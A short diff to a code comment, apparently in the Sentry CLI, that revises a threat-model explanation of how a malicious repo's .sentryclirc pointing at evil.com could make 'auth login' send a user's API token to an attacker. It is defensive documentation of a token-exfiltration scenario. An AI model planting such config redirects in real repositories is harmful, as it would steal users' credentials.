@@ -8,8 +8,8 @@
  * 2. User cd's into an attacker repo with `.sentryclirc` setting
  *    `url = https://evil.com`.
  * 3. User runs `sentry auth login --token $SENTRY_API_TOKEN` (no --url).
- * 4. The rc shim writes `env.SENTRY_URL = evil.com` (skipUrlTrustCheck is
- *    on for `auth login`). Without the refusal, login validation would
+ * 4. The rc shim writes `env.SENTRY_URL = evil.com` (the URL trust check
+ *    is deferred to buildCommand, and auth login has skipRcUrlCheck: true). Without the refusal, login validation would
  *    POST the user's token to evil.com.
  *
  * **Phishing** (`auth login` OAuth device flow, no --token):
